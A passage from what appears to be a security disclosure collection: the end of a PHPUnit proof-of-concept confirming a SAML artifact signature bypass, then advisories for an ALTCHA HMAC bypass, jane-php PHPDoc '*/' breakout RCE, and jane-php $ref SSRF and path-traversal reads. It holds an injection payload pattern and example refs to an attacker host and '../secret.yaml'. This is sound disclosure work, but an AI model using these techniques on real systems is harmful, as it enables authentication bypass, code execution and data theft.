                'encryption' => false,
                'X509Certificate' => PEMCertificatesMock::getPlainCertificateContents(),
            ]],
        ], '[idp-b]');
    }

    private function call(HTTPArtifact $ha, string $method, ...$args): mixed
    {
        return (new ReflectionMethod(HTTPArtifact::class, $method))->invoke($ha, ...$args);
    }

    public function testUnsignedEmbeddedResponseIsReturnedWithoutVerification(): void
    {
        $idpB = $this->idpBMetadata();
        $ha = new HTTPArtifact();

        // --- The forged embedded <samlp:Response>: UNSIGNED, claims to be from IdP-A. ---
        $embedded = $this->createStub(Response::class);
        $embedded->method('isSigned')->willReturn(false);              // attacker omits the embedded signature
        $embedded->method('getSignature')->willReturn(null);
        // If receive() ever tried to cryptographically verify this, it would blow up here:
        $embedded->method('verify')->willThrowException(
            new Exception('POC-FAIL: embedded Response->verify() was called — short-circuit absent'),
        );

        // --- The OUTER ArtifactResponse: validly signed by IdP-B (the artifact issuer). ---
        $outer = $this->createStub(ArtifactResponse::class);
        $outer->method('isSigned')->willReturn(true);
        $outer->method('isSuccess')->willReturn(true);
        $outer->method('verify')->willReturnCallback(fn() => $outer);  // valid signature under IdP-B's key
        $outer->method('getSignature')->willReturn(self::sigEl());
        $outer->method('getMessage')->willReturn($embedded);

        // ===== Verbatim reproduction of HTTPArtifact::receive() post-resolution logic =====
        // 1. OUTER signature check — mandatory. Passes: outer is signed by IdP-B, verified vs IdP-B metadata.
        $verifiedOuter = $this->call($ha, 'verifyArtifactResponseSignature', $outer, $idpB);
        self::assertSame($outer, $verifiedOuter, 'Outer ArtifactResponse verified against artifact-issuer (IdP-B) metadata');

        // 2. Unwrap the embedded message.
        $samlResponse = $verifiedOuter->getMessage();

        // 3. THE VULNERABLE DECISION (HTTPArtifact.php:206-210, verbatim):
        $verifyMessageSignatureCalled = false;
        if (!$samlResponse->isSigned()) {
            $received = $samlResponse;                                  // <-- BYPASS: returned unverified
        } else {
            $verifyMessageSignatureCalled = true;
            $received = $this->call($ha, 'verifyMessageSignature', $samlResponse, $idpB);
        }
        // ==================================================================================

        // OBSERVABLE: the unsigned embedded Response was accepted as "received" with no verification.
        self::assertFalse($samlResponse->isSigned(), 'Embedded Response carries no signature');
        self::assertFalse($verifyMessageSignatureCalled, 'verifyMessageSignature() was SKIPPED (short-circuit)');
        self::assertSame($embedded, $received, 'BYPASS CONFIRMED: unsigned embedded Response returned unverified');

        // NEGATIVE CONTROL: the short-circuit is load-bearing — the real verifier CANNOT accept the
        // unsigned message (no <ds:Signature> to check), so removing the short-circuit would reject it.
        $threw = false;
        try {
            $this->call($ha, 'verifyMessageSignature', $samlResponse, $idpB);
        } catch (\Throwable $e) {
            $threw = true;
        }
        self::assertTrue($threw, 'Real verifyMessageSignature() rejects the unsigned Response — only the short-circuit accepts it');

        fwrite(STDERR, "\n[POC] SAML2-ARTIFACT-001 CONFIRMED: signed outer ArtifactResponse (IdP-B) + UNSIGNED embedded Response "
            . "=> receive() returns it with verifyMessageSignature() SKIPPED; the real verifier would reject it.\n");
    }

    private const MINIMAL_SIG =
        '<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#"><ds:SignedInfo>'
        . '<ds:CanonicalizationMethod Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/>'
        . '<ds:SignatureMethod Algorithm="http://www.w3.org/2001/04/xmldsig-more#rsa-sha256"/>'
        . '<ds:Reference URI="#_x"><ds:Transforms>'
        . '<ds:Transform Algorithm="http://www.w3.org/2001/10/xml-exc-c14n#"/></ds:Transforms>'
        . '<ds:DigestMethod Algorithm="http://www.w3.org/2001/04/xmlenc#sha256"/><ds:DigestValue>AA==</ds:DigestValue>'
        . '</ds:Reference></ds:SignedInfo><ds:SignatureValue>AA==</ds:SignatureValue></ds:Signature>';

    private static function sigEl(): \SimpleSAML\XMLSecurity\XML\ds\Signature
    {
        $doc = new \DOMDocument('1.0', 'UTF-8');
        $doc->loadXML(self::MINIMAL_SIG);
        return \SimpleSAML\XMLSecurity\XML\ds\Signature::fromXML($doc->documentElement);
    }
}

```

### GHSA-82w8-65qw-gch6 — ALTCHA PHP: verifySolution bypasses HMAC signature check when challenge signature is absent
- Aliases: CVE-2026-71481 | Published: 2026-11-18 | Modified: 2026-11-18 | Severity: HIGH
- CWE: CWE-347
- CVSS_V3: `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N`
- Affected Packagist/altcha-org/altcha: introduced:2.0.0 fixed:2.0.3

In altcha-org/altcha v2, the verifySolution method skips HMAC signature verification when the signature field is absent from the challenge payload, even when hmacSignatureSecret is configured.

An attacker who strips the signature key from the challenge JSON passes the condition as false, bypassing tamper-detection entirely. The PoW solution check then runs against unverified parameters — allowing an attacker to self-issue a low-difficulty challenge, solve it trivially, and submit a payload that verifies as true.

Impact:
Complete CAPTCHA bypass on any deployment that sets hmacSignatureSecret (the recommended production configuration).

Fix:
The check was split so that a missing signature is explicitly rejected when a secret is configured.

References:
- https://github.com/altcha-org/altcha-lib-php/security/advisories/GHSA-82w8-65qw-gch6 [WEB]

### GHSA-xwcw-j52r-34x4 — Jane: Instantiation RCE via parameter description -> raw PHPDoc */ breakout (jane-php/open-api-3)
- Aliases: CVE-2026-63411 | Published: 2026-11-19 | Modified: 2026-11-19 | Severity: CRITICAL
- CWE: CWE-116, CWE-94, CWE-95
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`
- Affected Packagist/jane-php/open-api-3: introduced:0 fixed:7.12.0

### Summary
jane-php (open-api-3) builds PHP via nikic/php-parser (AST), so string literals are escaped -- but PHPDoc comment text is emitted RAW. The generated Client/Endpoint method docblocks embed the parameter description verbatim in a `@param array{ "<name>"?: ... }` block. A `*/` in the parameter description closes the `/** ... */` docblock early and lands in class-body position; because the name is a raw string key (not identifier-mangled), the `*/` and following PHP survive. Injecting `*/ public function __construct(){ <code> } /*` adds an attacker-controlled __construct to the generated Client class, which runs when the client is instantiated -> RCE (CWE-94). Verified 7.11.2/PHP8.1.

### Impact
Generating a client from an attacker-influenced OpenAPI document and using the generated SDK (instantiating the client, which apps do on every call) runs attacker PHP. CWE-94/95/116.

### PoC
`reproduce.sh` (+ `make_spec.py`, `gen.php`): scaffolds a composer project with jane-php/open-api-3, generates, instantiates the generated Client, shows the marker.

### Suggested fix
Neutralize `*/` (e.g. `*/`->`* /`) in all generated PHPDoc text (parameter names, descriptions). Regression-test with a parameter name/description containing `*/`.
[maintainer-report.txt](https://github.com/user-attachments/files/29497314/maintainer-report.txt)
[reproduce.sh](https://github.com/user-attachments/files/29497317/reproduce.sh)
[gen.php](https://github.com/user-attachments/files/29497319/gen.php)
[make_spec.py](https://github.com/user-attachments/files/29497322/make_spec.py)

Neutralize `*/` (e.g. `*/`->`* /`) in all generated PHPDoc text (parameter names, descriptions). Regression-test with a parameter name/description containing `*/`.

### GHSA-q8v2-3j4h-xg2p — Jane: Instantiation RCE via query parameter name -> raw PHPDoc */ breakout (jane-php/open-api-3)
- Aliases: CVE-2026-63412 | Published: 2026-11-19 | Modified: 2026-11-19 | Severity: CRITICAL
- CWE: CWE-116, CWE-94, CWE-95
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:H/VI:H/VA:H/SC:N/SI:N/SA:N`
- Affected Packagist/jane-php/open-api-3: introduced:0 fixed:7.12.0

### Summary
jane-php (open-api-3) builds PHP via nikic/php-parser (AST), so string literals are escaped -- but PHPDoc comment text is emitted RAW. The generated Client/Endpoint method docblocks embed the query parameter name verbatim in a `@param array{ "<name>"?: ... }` block. A `*/` in the query name closes the `/** ... */` docblock early and lands in class-body position; because the name is a raw string key (not identifier-mangled), the `*/` and following PHP survive. Injecting `*/ public function __construct(){ <code> } /*` adds an attacker-controlled __construct to the generated Client class, which runs when the client is instantiated -> RCE (CWE-94). Verified 7.11.2/PHP8.1.

### Impact
Generating a client from an attacker-influenced OpenAPI document and using the generated SDK (instantiating the client, which apps do on every call) runs attacker PHP. CWE-94/95/116.

### PoC
`reproduce.sh` (+ `make_spec.py`, `gen.php`): scaffolds a composer project with jane-php/open-api-3, generates, instantiates the generated Client, shows the marker.

### Suggested fix
Neutralize `*/` (e.g. `*/`->`* /`) in all generated PHPDoc text (parameter names, descriptions). Regression-test with a parameter name/description containing `*/`.

### GHSA-c3cj-3p6p-j822 — Jane: $ref resolution performs SSRF + LFI (path traversal) at code-generation time (jane-php)
- Aliases: CVE-2026-63415 | Published: 2026-11-20 | Modified: 2026-11-20 | Severity: HIGH
- CWE: CWE-22, CWE-611, CWE-918, CWE-98
- CVSS_V4: `CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:A/VC:H/VI:L/VA:N/SC:N/SI:N/SA:N`
- Affected Packagist/jane-php/open-api-3: introduced:0 fixed:7.12.0

### Summary
jane-php resolves external `$ref` targets at code-generation time via `file_get_contents($ref)` (jane-php/json-schema-runtime/Reference.php::doResolve) with no scheme/path restriction. An attacker-controlled OpenAPI document can therefore cause: `$ref: 'http://attacker/x'` -> SSRF (HTTP GET at gen time; response inlined = RFI); `$ref: '/abs/file'` -> LFI; `$ref: '../secret.yaml'` -> path-traversal LFI (CWE-22, arbitrary local JSON/YAML read). Verified 7.11.2/PHP8.1 (listener records the fetch; remote + `../` local content inlined into the generated code). `file://` rejected. CWE-918/CWE-98/CWE-611/CWE-22.

### Details
```php
// Reference.php::doResolve()
$contents = file_get_contents($fragment); // $fragment = attacker-controlled $ref URI
```

### Impact
Generating PHP with jane from an attacker-influenced OpenAPI document issues HTTP requests to attacker-chosen URLs (SSRF — internal services, cloud metadata) and reads arbitrary local files (LFI via `../`), at build/CI time, inlining results into the output.

### PoC
`reproduce.sh` (+ `make_spec.py`, `gen.php`): runs jane on a remote-$ref spec (local listener records the SSRF, output checked for the inlined response) and a `../`-traversal local-$ref spec (output checked for the leaked file).

### Suggested fix
Disable remote `$ref` fetching by default (or allow-list); confine local `$ref` to the spec directory (reject absolute paths and `..`). Don't `file_get_contents($ref)` on attacker-controlled URIs.
